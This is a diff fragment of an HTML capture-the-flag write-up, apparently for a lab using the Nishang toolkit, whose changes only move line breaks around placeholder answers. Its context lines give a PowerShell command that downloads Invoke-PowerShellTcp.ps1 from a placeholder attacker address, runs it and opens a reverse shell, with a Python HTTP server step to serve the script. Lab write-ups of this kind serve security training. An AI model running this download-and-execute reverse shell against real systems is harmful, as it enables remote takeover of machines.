@@ -19,10 +19,12 @@ In the foloowing link you´ll find more information about Nishang.https://github
 And in tis other link we will find more abour reverse shell scripts. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>
 
 > 1.1 - <em>How many ports are open? (TCP only)?</em><br>
->> <strong>Get-New</strong><br><br>
+>> <strong>Get-New</strong>
+<br><br>
 
 > 1.2 - <em>What is the username and password for the login panel? (in the format username:password)</em><br>
->> <strong>Get-New</strong><br><br>
+>> <strong>Get-New</strong>
+<br><br>
 
 <p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <code>powershell iex</code> (<em>New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</em></p>
 <p>You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: <code>python3 -m http.server</code></p>
